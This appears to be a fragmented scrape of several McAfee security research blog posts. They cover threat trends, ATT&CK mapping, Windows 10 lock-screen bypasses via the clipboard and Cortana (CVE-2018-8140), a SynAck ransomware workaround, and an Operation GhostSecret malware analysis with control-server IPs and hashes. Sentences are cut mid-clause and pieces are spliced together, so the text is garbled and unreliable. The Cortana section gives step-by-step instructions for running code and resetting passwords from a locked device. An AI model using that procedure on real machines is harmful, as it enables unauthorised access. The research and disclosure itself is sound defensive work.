As of now, major attacks against serverless apps have yet to be seen. Mind you, it could soon become a reality, as researchers have 
:\/:
 how to turn serverless apps into sources for crypto-mining. These researchers are in the minority, as many IT professionals don’t really 
:\/:
 and all the cyber risk associated with it – which in itself can pose the biggest risk of all. In fact, many security professionals 
:\/:
Children are being introduced to the internet and tech devices earlier than ever before. As exciting as that is, most kids are not properly trained on how to surf the web safely which can pose potential risks to their privacy. This type of exposure led us to predict that in 2018 organizations will begin to collect and leverage digital content generated by children, and parents will be unaware of how much information is out there about their kid.
:\/:
Though there has been no known incident yet in which a child’s information has been leveraged or compromised, some apps and 
:\/:
Beyond these predictions, there is also a variety of other threats security professionals could be facing in the second half of 2018. Just take 
:\/:
 for example – all of these attacks have proven that cybercriminals have come out into 2018 swinging. They’re going after high-profile, high stakes industries, and are using deceptive and sly techniques in order to steal information from these targets.
:\/:
Needless to say, the threat landscape is going to continue to change and evolve throughout 2018. However, no matter how the rest of the year unfolds, we’re confident that cyber defenders are ready to take on any future threat that may come their way.
:\/:

Every week we read about adversaries attacking their targets as part of online criminal campaigns. Information gathering, strategic advantage, and theft of intellectual property are some of the motivations. Besides these, we have seen during the past two years an increase in attacks in which adversaries are not shy of leaving a trail of destruction. One might wonder how to deal with these kinds of threats and where to start.
:\/:
 contains some great wisdom regarding the strategy of warfare. One of the most popular is the advice “If you know the enemy and know yourself, you need not fear the result of a hundred battles. If you know yourself but not the enemy, for every victory gained you will also suffer a defeat. If you know neither the enemy nor yourself, you will succumb in every battle.”
:\/:
Applying this advice to information security, let’s focus first on knowing yourself. Knowing yourself can roughly be divided into two parts:
:\/:
Every company has a value, it takes only one criminal mind to see that and to attempt to exploit it. Ask yourself what the core of your business is, the secret sauce that people might be after, what will take you out of business, whom you are doing business with, who are your clients, etc.
:\/:
Once you have identified your organization’s value, the second part of knowing yourself comes into play. You must understand where you to focus your defenses and invest in technology to detect and protect against threats.
:\/:
After wrapping up the knowing yourself part, what can we learn from the enemy? Ask yourself “Who would likely be interested in attacking me?” By going through the list of known adversaries and cybercriminal groups, you can create a list based on which geographies and vectors they target and classify them by risk. Here is a simplified example:
:\/:
Once you have your list and risk classification ready, you must next study the tactics, techniques, and procedures used by these adversaries. For mapping their techniques and associated campaigns, we use the 
:\/:
 Adversarial Tactics, Techniques, and Common Knowledge model (ATT&CK). The matrix covers hundreds of techniques, and can be applied for different purposes. In this case, we will focus on the risk versus mapping the defensive architecture.
:\/:
In Q1 of 2018, we mapped the targeted attacks discovered by ourselves and our peers in the industry. The following example comes from one adversary we tracked, showing the techniques they used:
:\/:
With MITRE’s Navigator tool you can select an actor or malware family. After making the selection, the boxes in the matrix show which techniques the actor or malware has used.
:\/:
From these techniques we can learn how our environments protect against these techniques and where we have gaps. The goal is not to create coverage or signatures for each technique; the matrix helps organizations understand how attackers behave. Having more visibility into their methods leads us to the right responses, and helps us contain and eradicate attacks in a coordinated way. By comparing the multiple actors from your initial risk assessment, you can build the matrix from the perspective of high/medium/low risk and map it against your defenses.
:\/:
Although some adversaries might not have a history of attacking you and your sector, it is still good to ask yourself “What if we were a target?” Would your environment create enough visibility to detect and deal with these techniques?
:\/:
When we looked at the first quarter, we noticed that the three techniques were the most popular in the category of Privilege Escalation:
:\/:
To determine your coverage and detection capacity, you should ask if the exploits used completely new vulnerabilities (no patches available) or if they had existed for a while. Would your environment have the right patches installed or are you missing them and have to take action?
:\/:
When we looked at the categories of Exfiltration and Command and Control, most campaigns exfiltrated their data over a control server channel using a common port. That translates to either TCP port 80 (HTTP) or TCP port 443 (HTTPS). We all use these ports from inside the network to communicate to the internet. What if all my other defenses would fail to discover the suspicious activity? Which defensive components in my network would be able to inspect the outgoing traffic and block or flag the exfiltration attempts?
:\/:
In this post, we highlighted one approach and application of the ATT&CK model. There are many ways to apply it for red teaming, threat hunting, and other tasks. At McAfee we embrace the model and are applying it to different levels and purposes in our organization. We are not only using it 
:\/:
The McAfee Labs Advanced Threat Research team has been investigating the Windows 10 platform. We have submitted several vulnerabilities already and have disclosed our research to Microsoft. Please refer to our 
:\/:
 in Windows 10. This technique no longer works on most current builds of Windows 10, but a variation of this simple method works quite well on some versions of Windows 10, specifically RS1 (RedStone 1).
:\/:
The issue is simple to describe and execute. For a local attack, you can use a physical keyboard; if there is a network vector that would allow one to remotely reach the Windows login screen (such as RDP), you can use the software-based keyboard accessible from the lock screen. On all versions of Windows 10, the “paste” function appears to be intentionally forbidden from the Windows lock screen, including the “Hey Cortana” function. The original finding demonstrated CTRL+V could be used to paste clipboard contents. This is now disabled, even on RS1. However, we have found a way to bypass this restriction using the keyboard shortcut CTRL + SHIFT + INSERT, allowing us to access in plain text the clipboard contents, whatever they may be. While we are continuing to explore this technique to force-copy functions (and access arbitrary content), for now we can access whatever happens to be copied. In the demo this is a password allowing login.

Even if you have not heard of blockchain, you have likely heard of cryptocurrencies, namely Bitcoin, the most popular implementation. In late 2017 Bitcoin reached a value of 
:\/:
 prompting a lot of interest in the currency—including from cybercriminals. Cryptocurrencies are built on top of blockchain, which records transactions in a decentralized way and enables a trusted “ledger” between trustless participants. Each block in the ledger is linked to the next block, creating a chain. Hence, the system is called a blockchain. The chain enables anyone to validate all transactions without going to an outside source. From this, decentralized currencies such as Bitcoin are possible.
:\/:
Attackers have adopted many methods targeting consumers and businesses. The primary attack vectors include phishing, malware, implementation vulnerabilities, and technology. In a phishing scheme in January, Iota cryptocurrency lost

 to scams that lasted several months. Malware authors often change their focus. In late 2017 to early 2018 some have migrated from deploying ransomware to cryptomining. They have been found using open-source code such as

Implementation vulnerabilities are the flaws introduced when new technologies and tools are built on top of blockchain. The recent EOS attack is one example. In mid-July 2017 Iota

Known attacks against the core blockchain technology are much more difficult to implement, although they are not unheard of. The most widely known attack is the 51% attack, or

 can allow an attacker to completely control a targeted victim’s ledger. Attempts have been made for larger scale Sybil attacks such as

Blockchain may be a relatively new technology but that does not mean that old attacks cannot work. Mostly due to insecure user behavior, dictionary attacks can leverage some implementations of blockchain. Brain wallets, or wallets based on weak passwords, are insecure, yet people still use them. These wallets are routinely stolen, as was the case with the nearly BTC60 stolen from the following wallet:
:\/:
This wallet recorded two transactions as recently as March 5, 2018. One incoming and one outgoing transaction occurred within roughly 15 minutes. Source: 
:\/:
The biggest players, and targets, in blockchain are cryptocurrency exchanges. Cryptocurrency exchanges can be thought of as banks in which you users create accounts, manage finances, and even trade currencies including traditional ones. One of the most notable incidents is the attack against Mt. Gox between 2011‒2014 that resulted in $450 million of Bitcoin stolen and led to 
:\/:
 victims for their losses in March 2018. Not all recent exchanges fared so well. Bitcurex abruptly closed and led to an official 
:\/:
Blockchain technologies and its users are heavily targeted by profit-driven cybercriminals. Current attackers are changing their tactics and new groups are entering the space. As more businesses look to blockchain to solve their business problems and consumers increasingly rely on these technologies, we must be diligent in understanding where the threats lie to achieve proper and tailored risk management. New implementations must place security at the forefront. Cybercriminals have already enjoyed successes against the users and implementations of blockchain so we must prepare accordingly.

June’s “Patch Tuesday” (June 12) is here, but it is likely many Windows 10 users have not yet applied these updates. If you have not, just be sure not to leave your laptop lying around! The patches in this cycle fix a code execution vulnerability using the default settings for Windows 10 and the “Cortana” voice assistant. We’ll detail how this vulnerability can be used to execute code from the locked screen of a fully patched Windows 10 machine (RS3 at the time of our original submission, and confirmed on RS4 prior to this patch cycle). The vulnerability was submitted to Microsoft as part of the McAfee Labs Advanced Threat Research team’s 
:\/:
, on April 23. Attribution for this vulnerability submission goes to Cedric Cochin, Cyber Security Architect and Senior Principal Engineer.
:\/:
In this post, we will address three vectors of research that have been combined by Microsoft and together represent CVE-2018-8140. The first of these is an information leak, but we’ll culminate with a demo showing full code execution to log in to a locked Windows device!
:\/:
Personal digital assistants such as Siri, Alexa, Google Assistant, and Cortana have become commodities in many technologically inclined houses. From telling jokes, to helping with the grocery list, to turning on the kitchen lights, these robotic voices are beginning to feel oddly more and more personal as they expand their roles in our daily lives. However, we should consider the increased risk of built-in digital personal assistants when looking at new attack vectors for laptops, tablets, and smartphones. Our research on Microsoft’s Cortana voice assistant began after reading about the 
:\/:
 demonstrated by industry researchers. We decided to take this a step further and ended up finding and reporting to Microsoft several issues related to Cortana.
:\/:
If you have spoken with Cortana, you may have noticed that “she” is very helpful for a number of simple tasks: providing definitions, or looking up corporations, movies, artists, or athletes. She can even do math! In Windows 10, on the most recent build at the time of submission, we observed that the default settings enable “Hey Cortana” from the lock screen, allowing anyone to interact with the voice-based assistant. This led to some interesting behavior and ultimately vulnerabilities allowing arbitrary code execution.
:\/:
We begin this analysis with a quick look into Windows indexing. If you have ever opened the advanced view of the Windows Indexing control panel, and navigated to the File Types tab, you will see a long list of file extensions. For each of them you will find details about the associated filter used by the indexing process. Essentially you have the “file properties filter” and several other filters that could all be summarized as “file properties and file content filter.”
:\/:
This means the index process will crack open the files and index their content, including some strings present in these documents. Let’s keep that in mind for later as we continue.
:\/:
Using this knowledge, we wanted to try to access the same menu that you would see when using a Cortana search on an unlocked device.
:\/:
 while Cortana starts to listen to a query on a locked device will bring up a Windows contextual menu, as shown below:
:\/:
 no preamble to the question, just speaking the three letters, P. A. S. Why not “pass”? Because Cortana can be quite picky with verbal statements and there is no dictionary definition for “pass,” leading to Cortana inviting us to continue in Edge after unlocking the device. Alternatively, instead of issuing a verbal statement, we could click on the “tap and say” button and just start typing this text, for example.
:\/:
Remember that all the results presented by Cortana come from indexed files and applications, and that for some applications the content of the file is also indexed. Now we can simply hover over any of the relevant matches. If the match is driven by 
:\/:
 matching, then you will be presented with the full path of the file. If the match is driven by the 
:\/:
Keep in mind that the entire user folder structure is indexed, which includes the default location for most documents but also for mappings like OneDrive.
:\/:
Armed with this knowledge, you can use your imagination to come up with specific keywords that could be used to start harvesting confidential information from the locked device.
:\/:
Next, we asked the question: Could we go a step further and get code execution in the context of the authenticated user? Remember we are using only a combination of voice commands and mouse/touchpad/touchscreen to gain access to the contextual menu at this point. We observed that just by hovering over a file, the full path or content of the file would be displayed. What happens if we were to click on it? That depends on the target. If the file being opened is an application or an executable (such as notepad or calc.exe), the file will run and be accessible only after the user properly logs in. If it is a document, script, or text file, it will be opened by an editor instead of being executed. At this point we can execute various preloaded Windows utilities such as calculator, but we cannot pass any parameters to the command line. We can open scripts including PowerShell, but instead of being executed, they will be opened in a text editor (notepad). The lack of parameters is a limitation for a “live off the land” attack, which uses current tools and content to achieve a malicious purpose; however, there are plenty of malicious activities that could be performed even with these restrictions. For example, many uninstallers will happily remove software without any need for parameters.
:\/:
Let’s return to our goal: code execution from the lock screen. The only requirement for something to show up in the contextual menu is for it to be indexed.
:\/:
There are multiple ways for an unauthenticated attacker to get results to show up in the index of an authenticated user. One method relies on OneDrive. As the root of the OneDrive directory structure is in the user folder, all the OneDrive content is indexed by default. Basically, if you ever share a folder or file with “edit” rights, the person you share it with, as well as any other recipients of a forwarded link, can now drop a file that will be indexed. With the file indexed we have multiple options to proceed.
:\/:
This method assumes you can write an executable file to the disk; it does not require you to have executed it. Via a phishing attack or another vulnerability, an attacker could drop a backdoor (for example, Cobalt Strike Beacon or Meterpreter) and be in business. If you need to execute the payload as an administrator, you can simply right-click (for a touchscreen this is a longer-hold screen press) and select “Run as administrator.”
:\/:
When running applications that do not have the Auto-Elevate Privilege, you will trigger a user account control (UAC) prompt and nothing will execute. This could still result in a valid attack because users rarely check the content of the prompt and often proceed through the warning dialog box. The attacker would have to execute the program, and then wait for the authenticated user to log in and finish the job. If the application has auto-elevate privileges, there will be no UAC prompt and the application will execute at high integrity.
:\/:
This is interesting behavior, but on its own not a very likely attack scenario, so let’s continue to explore our options. Why not simply use a USB key to drop the payload because we have physical access? The content of the USB key is not indexed, so it would not be presented as a result of the search query (although there are other ways to use a USB device; see below).
:\/:
Portable executable (PE) backdoors are great, but can we gain execution with a non-PE payload, for example, a PowerShell script?  We can use the same right-click capability to assist, but with a small twist. The right-click menu is not always the same, even for a given file type.
:\/:
When you ask Cortana about “PS1,” you will be presented with your indexed PowerShell scripts. A right click will allow you to “open file location” or “copy full path,” but with no means of execution.
:\/:
If you click on the file as we already mentioned, the file will open in edit mode. Curiously, it will not open the default editor (PowerShell ISE) for PowerShell scripts; instead, it will open the script in notepad. We assume this was intended as a security measure because notepad cannot execute scripts, unlike PowerShell ISE.
:\/:
Remember we mentioned that Cortana changes results based on your input query? When properly logged in, if you ask Cortana about “txt” using the query “Hey Cortana” followed by the letters “T,” “X,” “T,” she will present you with text documents, Notepad, and the most recent documents open by Notepad. Yet the right-click menu for items in the Recent category is different than the right-click menu for the same item in the Documents category.
:\/:
Right click on the PowerShell script in the Recent category under the Apps tab at the top (not Documents)
:\/:
We now have local code execution with the payload of our choosing, without any exploit, even if the device is encrypted, on an up-to-date locked Windows 10 device.
:\/:
This technique helps us understand some of the differences between apps, documents, extensions, and the way Windows handles them from a locked or unlocked screen. Yet it probably does not represent much of a real-world attack vector. Then again, we are not finished.
:\/:
Finally, we have local code execution, but with some real limitations. We need to get our payload indexed but we cannot pass command-line parameters. This could be a limiting factor for our PowerShell attack vector because the execution policy may prevent its execution, and without command-line parameters we cannot pass an “-ExecutionPolicy Bypass” (or any other flavor). We would also have to find a way to land a PS1 script on the victim’s box, 
:\/:
The techniques we have described so far are far too complicated compared with the simplicity and effectiveness of what comes next.
:\/:
You recall the use of the keyboard-timing sequence to trigger the contextual search menu from a locked screen while querying Cortana. Any keystroke can trigger the menu from the time when Cortana begins to listen to when the answer is displayed. Press any key at this point; we like to use the spacebar because you cannot backspace and Windows will nicely ignore or trim out the space in its text results anyways. Invoke keyboard input too early or before Cortana is listening and you will be prompted to enter your password; invoke too late and Cortana goes back to sleep or returns normal results without a context menu.
:\/:
It is not very intuitive to use the keyboard in addition of voice commands, but you can type your search the same way you do on an unlocked device, assuming that you triggered Cortana to listen.
:\/:
When done (carefully) typing your command, click on the entry in the Command category. (This category will appear only after the input is recognized as a command.)
:\/:
You can always right click and select “Run as Administrator” (but remember the user would have to log in to clear the UAC)
:\/:

What can we do at this point? You name it. Our demo below shows a password reset and login on a Windows 10 build, using only this simple technique.

Cortana on the lock screen. This week’s Patch Tuesday from Microsoft contains fixes for these issues under CVE-2018-8140.
:\/:
This concludes our examination of Cortana (at least for now). The McAfee Advanced Threat Research team has a fundamental goal of eliminating critical threats to the hardware and software we use; this month’s patch is a clear step toward furthering that goal. The attack surface created by vocal commands and personal digital assistants requires much more investigation; we are just scratching the surface of the amount of research that should be conducted in this critical area.

A team of several independent researchers also discovered and disclosed this vulnerability around the time of our submission. Additional credit for this discovery goes to: Ron Marcovich, Yuval Ron, Amichai Shulman and Tal Be’ery. Their names are also on the

McAfee’s Advanced Threat Research team has performed analysis on samples of Syn/Ack ransomware implementing Process Doppelgänging.  For those who are concerned about the potential impact of this ransomware but are currently unable to implement McAfee product protections, we have found a simple but interesting alternative method.  Prior to encryption and ransom, the malware first checks if one of several hardcoded keyboards or languages is installed on the target machine.  If found, the malicious code will terminate, effectively resulting in an extremely simple “patch” of sorts. We have tested the following steps to be effective on several versions of Windows 7 and theoretically on Windows 10 – preventing the malware from encryption and ransom.  These steps can be taken proactively.  Due to limited scope of testing at this time, this technique may not work on all systems, release versions, and configurations.
:\/:
That’s all it takes!  Please note – this should not be considered a fully effective or long-term strategy.  It is highly likely the malware will change based on this finding; thus, we recommend the McAfee product protections referenced above for best effect.
:\/:
That adversaries adopt new techniques is a known fact. However, the speed they include new innovative techniques to bypass end-point security and or evade sandboxing appears to be at an ever-increasing pace. Indeed, adversary adoption is often faster than the InfoSec industry can implement and test effective countermeasures. For example, in December 2017, a tool was released to hide PowerShell in a graphic file. Within 7 days of the release, McAfee Advanced Threat Research started to see the technique being exploited by a Nation State actor. From announcement to inclusion, test and use in production within 7 days is impressive.
:\/:
This week, security-researchers from Kaspersky discovered that an actor was applying the so-called Process Doppelgänging technique in what has been named the “SynAck” ransomware. (https://securelist.com/synack-targeted-ransomware-uses-the-doppelganging-technique/85431/)
:\/:
Using this technique gives the malware writer an ability to run malicious code/executable under the cover of a legitimate executable by using the transaction features of the NTFS filesystem (Windows Transactional NTFS API).
:\/:
Since the initial release of this technique in December 2017, McAfee Labs has been investigating this technique and how we might protect our customers. In contrast to adversaries who can release mistakes in code and implementation, we simply cannot. We have to thoroughly test to ensure that when we release our solution it detects correctly and does not disrupt or break other software.
:\/:
McAfee’s Product Security Incident Team (PSIRT), working in coordination with McAfee’s product teams
:\/:
 delivered a protection to Process Doppelgänging in two of McAfee’s product suites (see below for more detail). McAfee’s protection has tested effective against EnSilo’s original proof of concept (PoC) and other examples. As an example, we tested recent malware using the technique against our detection feature with success:
:\/:
McAfee’s protection prevents execution of a file if changes to it are contained within a Windows NTFS transaction. There are no legitimate uses for the Transactional API to be used in this way, so far as McAfee know.
:\/:
WSS 16.0.12 will include the same protection.  Release of WSS is targeted for the end of May, or the beginning of June, 2018.
:\/:
EnSilo have documented that attempts to exploit Win 10 Pre RS3 results in a Windows crash, “Blue Screen of Death” (BSOD). McAfee’s testing confirms Ensilo’s results.
:\/:
 under some versions of Windows. McAfee testing indicates that all versions of product under every Windows version listed above are protected.

McAfee Advanced Threat Research analysts have uncovered a global data reconnaissance campaign assaulting a wide number of industries including critical infrastructure, entertainment, finance, health care, and telecommunications. This campaign, dubbed Operation GhostSecret, leverages multiple implants, tools, and malware variants associated with the state-sponsored cyber group Hidden Cobra. The infrastructure currently remains active. (For an extensive analysis by the Advanced Threat Research team, see 
:\/:
The campaign is extremely complicated, leveraging a number of implants to steal information from infected systems and is intricately designed to evade detection and deceive forensic investigators. The implants vary considerably and although they share some functionality and code, they are categorized as different families. As McAfee Advanced Threat Research analysts investigated this campaign, we recognized many similarities to indicators used in the 2014 Sony Pictures attack.
:\/:
 was recently discovered by McAfee Advanced Threat Research analysts. This appears to have been the initial stage of Operation GhostSecret, as within days of publication, new attacks appeared  beyond the financial sector. Between March 14 and 18, we observed the data reconnaissance implant in organizations across 17 countries.
:\/:
Delving further into this campaign reveals a narrow list of organizations across the globe; the threat actors have been explicit about who can connect from which IP address. Reviewing the WHOIS information for these IP addresses shows us that there is some correlation in geography, although there are no additional clues why these addresses were used.
:\/:
As we monitor this campaign, it is clear that the publicity associated with the (we assume) first phase of this campaign did nothing to slow the attacks. The threat actors not only continued but also increased the scope of the attack, both in types of targets and in the tools they used. We try to avoid using the word 
:\/:
 because it is both subjective and overused. Nonetheless, the attackers have significant capabilities, demonstrated by their tools development and the pace at which they operate.
:\/:
Fighting cybercrime is a global effort best undertaken through effective partnerships between the public and private sectors. McAfee is working with Thai government authorities to take down the control server infrastructure of Operation GhostSecret, while preserving the systems involved for further analysis by law enforcement authorities. By creating and maintaining partnerships with worldwide law enforcement, McAfee demonstrates that we are stronger together.
:\/:
McAfee Advanced Threat Research analysts have uncovered a global data reconnaissance campaign assaulting a wide number of industries including critical infrastructure, entertainment, finance, health care, and telecommunications. This campaign, dubbed Operation GhostSecret, leverages multiple implants, tools, and malware variants associated with the state-sponsored cyber group Hidden Cobra. The infrastructure currently remains active. In this post, we dive deeply into this campaign. For a brief overview of this threat, see 
:\/:
“Global Malware Campaign Pilfers Data from Critical Infrastructure, Entertainment, Finance, Health Care, and Other Industries.”
:\/:
Our investigation into this campaign reveals that the actor used multiple malware implants, including an unknown implant with capabilities similar to Bankshot. From March 18 to 26 we observed the malware operating in multiple areas of the world. This new variant resembles parts of the Destover malware, which was used in the 2014 Sony Pictures attack.
:\/:
Furthermore, the Advanced Threat Research team has discovered Proxysvc, which appears to be an undocumented implant. We have also uncovered additional control servers that are still active and associated with these new implants. Based on our analysis of public and private information from submissions, along with product telemetry, it appears Proxysvc was used alongside the 2017 Destover variant and has operated undetected since mid-2017.
:\/:
The attackers behind Operation GhostSecret used a similar infrastructure to earlier threats, including SSL certificates used by FakeTLS in implants found in the Destover backdoor variant known as Escad, which was used in the Sony Pictures attack. Based on our technical analysis, telemetry, and data from submissions, we can assert with high confidence that this is the work of the Hidden Cobra group. The Advanced Threat Research team uncovered activity related to this campaign in March 2018, when the actors targeted Turkish banks. These initial findings appear to be the first stage of Operation GhostSecret. For more on the global aspect of this threat, see “Global Malware Campaign Pilfers Data from Critical Infrastructure of Entertainment, Finance, Health Care, and Other Industries.”
:\/:
The McAfee Advanced Threat Research team discovered a previously unknown data-gathering implant that surfaced in mid-February 2018. This implant appears to be a derivative of implants authored before by Hidden Cobra and contains functionality similar to that of Bankshot, with code overlaps from other Hidden Cobra implants. However, the variant is not based on Bankshot. Our analysis of the portable executable’s rich-header data reveals that the two implants were compiled in different development environments. (The PE rich header is an undocumented part of a Windows executable that reveals unique information to identify the Microsoft compiler and linker used to create the program. It is helpful for identifying similarities between malware variants to establish common development environments.) Our analysis of the code and PE rich header indicates that Bankshot, Proxysvc, and the Destover-like implant are distinct families, but also contain overlapping code and functionality with current tools of Hidden Cobra.
:\/:
When we compared the PE rich header data of the new February 2018 implant with a variant of Backdoor.Escad (Destover) from 2014 shortly before the Sony Pictures attack, we found the signatures to be identical. The Destover-like variant is 83% similar in code to a 2015 variant and contains the same rich PE header signature as the Backdoor.Escad variant we analyzed. Thus the new implant is likely a derivative of components of Destover. We determined that the implant is not a direct copy of well-known previous samples of Destover; rather, Hidden Cobra created a new hybrid variant using functionality present in earlier versions.
:\/:
The February implant fe887fcab66d7d7f79f05e0266c0649f0114ba7c was obtained from an unknown submitter in the United States on February 14, two days after it was compiled. This Korean-language file used the control server IP address 203.131.222.83. The implant is nearly identical to an unknown 2017 sample (8f2918c721511536d8c72144eabaf685ddc21a35) except that the control server addresses are different. The 2017 sample used address 14.140.116.172. Both implants specifically use FakeTLS with PolarSSL, which we saw in previous Hidden Cobra implants. PolarSSL libraries have appeared in implants since the Sony Pictures incident and were used exclusively in the implant Backdoor.Destover. This implant incorporated a custom control server protocol that sends traffic over port 443. The implementation does not format the packets in standard SSL, but rather in a custom format and transmitted over SSL—hence, FakeTLS. The control server traffic when compared to Backdoor.Escad is nearly identical.
:\/:
Further research into IP address 14.140.116.172 leads us to additional hidden components involved in the overall infrastructure. Proxysvc.dll contains a list of hardcoded IP addresses, including the preceding address, all located in India. Despite the name, this component is not an SSL proxy, but rather a unique data-gathering and implant-installation component that listens on port 443 for inbound control server connections.
:\/:
Proxysvc was first collected by public and private sources on March 22 from an unknown entity in the United States. The executable dropper for the component was submitted from South Korea on March 19. McAfee telemetry analysis from March 16 to 21 reveals that Proxysvc components were active in the wild. Our research shows this listener component appeared mostly in higher education organizations. We suspect this component is involved in core control server infrastructure. These targets were chosen intentionally to run Proxysvc because the attacker would have needed to know which systems were infected to connect to them. This data also indicates this infrastructure had been operating for more than a year before its discovery. The Advanced Threat Research team found this component running on systems in 11 countries. Given the limited capabilities of Proxysvc, it appears to be part of a covert network of SSL listeners that allow the attackers to gather data and install more complex implants or additional infrastructure. The SSL listener supports multiple control server connections, rather than a list of hardcoded addresses. By removing the dependency on hardcoded IP addresses and accepting only inbound connections, the control service can remain unknown.

Further investigation into the control server infrastructure reveals the SSL certificate d0cb9b2d4809575e1bc1f4657e0eb56f307c7a76, which is tied to the control server 203.131.222.83, used by the February 2018 implant. This server resides at Thammasat University in Bangkok, Thailand. The same entity hosted the control server for the Sony Pictures implants. This SSL certificate has been used in Hidden Cobra operations since the Sony Pictures attack. Analyzing this certificate reveals additional control servers using the same PolarSSL certificate. Further analysis of McAfee telemetry data reveals several IP addresses that are active, two within the same network block as the 2018 Destover-like implant.
:\/:
McAfee Advanced Threat Research determined that the Destover-like variant originated from code developed in 2015. The code reappeared in variants surfacing in 2017 and 2018 using nearly the same functionality and with some modifications to commands, along with an identical development environment based on the rich PE header information.
:\/:
Both implants (fe887fcab66d7d7f79f05e0266c0649f0114ba7c and 8f2918c721511536d8c72144eabaf685ddc21a35) are based on the 2015 code. When comparing the implant 7fe373376e0357624a1d21cd803ce62aa86738b6, compiled on August 8, 2015, we found it 83% similar to the implant from 2018. The key similarities and differences follow.
:\/:
Both variants build their API imports dynamically using GetProcAddress, including wtsapi32.dll for gathering user and domain names for any active remote sessions
:\/:
Both variants contain a variety of functionalities based on command IDs issued by the control servers
:\/:
Both variants run commands on the system, log output to a temporary file, and send the contents of the file to their control servers
:\/:
Reading the contents of a file on disk. If the filepath specified is a directory, then listing the directory’s contents.
:\/:
The 2015 implant does not contain a hardcoded value of the IP address it must connect to. Instead it contains a hardcoded sockaddr_in data structure (positioned at 0x270 bytes before the end of the binary) used by the connect() API to specify port 443 and control server IP addresses:
:\/:
Both of these control servers used the PolarSSL certificate d0cb9b2d4809575e1bc1f4657e0eb56f307c7a76.
:\/:
At first glance Proxysvc, the SSL listener, looks like a proxy setup tool (to carry out man-in-the-middle traffic interception). However, a closer analysis of the sample reveals it is yet another implant using HTTP over SSL to receive commands from the control server.
:\/:
Proxysvc appears to be a downloader whose primary capability is to deliver additional payloads to the endpoint without divulging the control address of the attackers. This implant contains a limited set of capabilities for reconnaissance and subsequent payload installations. This implant is a service DLL that can also run as a standalone process.
:\/:
The implant cannot connect to a control server IP address or URL. Instead it accepts commands from the control server. The implant binds and listens to port 443 for any incoming connections.
:\/:
Proxysvc makes an interesting check while accepting connections from a potential control server. It checks against a list of IP addresses to make sure the incoming connection is 
:\/:
from any of the following addresses. If the incoming request does come from one of these, the implant offers a zero response (ASCII “0”) and shuts down the connection.
:\/:
The implant receives HTTP-based commands from a control server and parses the HTTP Content-Type and Content-Length from the HTTP header. If the HTTP Content-Type matches the following value, then the implant executes the command specified by the control server:
:\/:
Gathering system information and sending it to the control server. The system information gathered from the endpoint includes:

:\/:
This information is concatenated into a single string in the format: “MAC_Address|ComputerName|ProductName” and is sent to the control server
:\/:
Recording HTTP requests from the control server to the temporary file prx in the implant’s install directory with the current system timestamp
:\/:
The February 2018 implant contains a wide variety of capabilities including data exfiltration and arbitrary command execution on the victim’s system. Given the extensive command structure that the implant can receive from the control server, this is an extensive framework for data reconnaissance and exfiltration, and indicates advanced use. For example, the implant can wipe and delete files, execute additional implants, read data out of files, etc.
:\/:
The implant begins execution by dynamically loading APIs to perform malicious activities. Libraries used to load the APIs include:
:\/:
As part of its initialization, the implant gathers basic system information and sends it to its hardcoded control server 203.131.222.83 using SSL over port 443:
:\/:
Disk space information for disks C: through Z: including total memory in bytes, total available memory in bytes, etc.
:\/:
The implant receives commands over SSL as encoded data. This data is decoded, and the correct command ID is derived. Valid command IDs reside between 0 and 0x1D.
:\/:
Gather system information and exfiltrate to the control server (same as the basic data-gathering functionality previously described)
:\/:
Get volume information for all drives on the system (A: through Z:) and exfiltrate to the control server
:\/:
Execute a binary on the system using cmd.exe and log the results into a temp file, which is then read and the logged results are sent to the control server. The command line:
:\/:
This analysis by the McAfee Advanced Threat Research team has found previously undiscovered components that we attribute to Hidden Cobra, which continues to target organizations around the world. The evolution in complexity of these data-gathering implants reveals an advanced capability by an attacker that continues its development of tools. Our investigation uncovered an unknown infrastructure connected to recent operations with servers in India using an advanced implant to establish a covert network to gather data and launch further attacks.
:\/:
The McAfee Advanced Threat Research team will provide further updates as our investigation develops.
:\/:
Fighting cybercrime is a global effort best undertaken through effective partnerships between the public and private sectors. McAfee is working with Thai government authorities to take down the control server infrastructure of Operation GhostSecret, while preserving the systems involved for further analysis by law enforcement authorities. By creating and maintaining partnerships with worldwide law enforcement, McAfee demonstrates that we are stronger together.  
:\/:
Exfiltration over control server channel: data is exfiltrated over the control server channel using a custom protocol
:\/:
Commonly used port: the attackers used common ports such as port 443 for control server communications
:\/:
Automated collection: the implant automatically collects data about the victim and sends it to the control server
:\/:
System time discovery: part of the data reconnaissance method, the system time is also sent to the control server

McAfee Advanced Threat Research team analysts have studied Adobe Flash Player for years because it is a popular target for attacks. As always, we advise customers to remain current with McAfee’s latest DAT versions. In this post we want to provide some insight into the history of Flash exploitation and possible future trends.
:\/:
 an analysis of a new set of Flash flaws, CVE-2018-4878, that have been exploited in the wild. Hardik Shah of McAfee Labs 
:\/:
“The number of Flash Player exploits has recently declined, due to Adobe’s introduction of various measures to strengthen Flash’s security. Occasionally, however, an exploit still arises. On January 31, 
:\/:
 a zero-day vulnerability, identified as CVE-2018-4878, being exploited in the field. (Adobe has released 
:\/:
This post will examine the history of Flash’s issues since the first Common Vulnerabilities and Exposures (CVE) list for Flash was published in 2006. By examining some of the data, both users and owners of sites that employ Flash can better understand Flash flaws and why Flash will continue to interest attackers, even though Adobe 
:\/:
We examined historical Flash data regarding vulnerabilities. We also accounted for the current distribution and uses of Flash. Through this analysis, we believe that despite Adobe announcing Flash’s end of life, a number of sites will continue to use and depend upon Flash for at least the immediate future, even as sites convert to alternative technologies. (See the list of example sites, below.) Flash continues to offer attackers an exploitable collection of flaws for the immediate future.
:\/:
The following chart uses CVE data. Although not every exploitable and exploited condition receives a CVE entry, most flaws that are discovered through security research or reported against major software vendors’ products eventually gains a CVE number that is posted to the 
:\/:
 kept by Mitre. Therefore, CVE offers a convenient repository of vulnerability data to aid research.
:\/:
Searching the entire database for every instance of “Flash Player” or “Adobe Flash Player” returned 1,050 CVE entries from the years 2006-2017.
:\/:
There was a steady increase in reported vulnerabilities between 2006 and 2014. Then we saw a big jump in 2015 and 2016. Of the 1,050 issues, about 79% (830) gave attackers some sort of code execution capability, though not every one of those 830 flaws allowed remote code execution. Still, an attacker gains a significant advantage from running any code. The McAfee Labs 
:\/:
 shows that CVE-2018-4878 was another example of remote code execution, which usually leads to full compromise. This point suggests that Flash vulnerabilities will remain a significant target.
:\/:
These severe scores further highlight why attackers remain interested in exploiting Flash weaknesses; they offer significant “attacker value” for the effort required to exploit them.  Looking at the historical distribution of issues, we see a spike in 2015. Then the spike drops off. It was in the latter part of 2014 that Adobe adopted a change in their software security strategy.
:\/:
